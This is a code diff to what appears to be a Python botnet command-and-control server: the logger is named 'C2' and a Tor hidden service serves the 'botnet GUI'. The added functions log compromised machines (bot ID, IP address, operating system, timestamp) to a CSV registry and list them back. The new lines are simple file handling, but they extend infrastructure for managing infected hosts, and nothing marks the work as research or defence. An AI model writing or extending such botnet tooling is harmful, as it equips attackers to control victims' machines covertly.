@@ -59,6 +59,31 @@ logger = logging.getLogger('C2')
 
 _control_url_state = {"value": None, "mtime": None}
 
+def save_bot_to_registry(bot_id, bot_ip, os_info):
+    with open(BOT_REGISTRY_FILE, 'a', newline='') as csvfile:
+        fieldnames = ['bot_id', 'bot_ip', 'os_info', 'timestamp']
+        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+
+        if csvfile.tell() == 0:  # Write header only if file is empty
+            writer.writeheader()
+
+        writer.writerow({
+            'bot_id': bot_id,
+            'bot_ip': bot_ip,
+            'os_info': os_info,
+            'timestamp': time.time()
+        })
+    logger.info(f"Bot {bot_id} registered and saved to {BOT_REGISTRY_FILE}")
+
+def get_registered_bots():
+    bots_data = []
+    if not BOT_REGISTRY_FILE.exists():
+        return bots_data
+    with open(BOT_REGISTRY_FILE, 'r', newline='') as csvfile:
+        reader = csv.DictReader(csvfile)
+        for row in reader:
+            bots_data.append(row)
+    return bots_data
 
 def _sync_control_url_html(onion_url: str) -> None:
     """Ensure the torsite hidden service serves the botnet GUI."""
